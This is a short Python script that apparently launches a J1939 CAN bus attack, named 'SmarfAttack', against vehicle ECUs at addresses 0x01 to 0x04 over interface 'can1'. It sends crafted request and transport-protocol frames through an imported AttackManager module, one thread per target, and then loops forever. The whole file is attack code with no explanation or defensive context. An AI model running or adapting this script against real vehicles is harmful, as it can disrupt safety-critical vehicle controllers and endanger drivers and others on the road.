import AttackManager
import _thread

data_len = 8
can_name = "can1"


def StartAttack(strDes):
	
	first_step = "00EA00" + strDes.upper()
	first_step_data = "EBFE000000000000"

	second_step = "18ec" + strDes + "00"

	third_step = "00EC00" +  strDes.upper()
	third_step_data  = "110701FFFFEBFE00"

	forth_step = "18eb" + strDes + "00"

	final_step = "00EC00" + strDes.upper()
	final_step_data = "122C0007FFEBFE00"

	attMgr = AttackManager.AttackManager(can_name)
	attMgr.SmarfAttack( data_len , first_step , first_step_data ,second_step , third_step ,third_step_data , forth_step , final_step ,final_step_data  )
	


for i in range(0x01,0x05):
	
	print (hex(i))
	strDes = str(hex(i).split('x')[1])
	if len (strDes ) % 2 == 1 :
		strDes = "0" + strDes

	_thread.start_new_thread( StartAttack, (strDes,) )

while 1:
   pass	
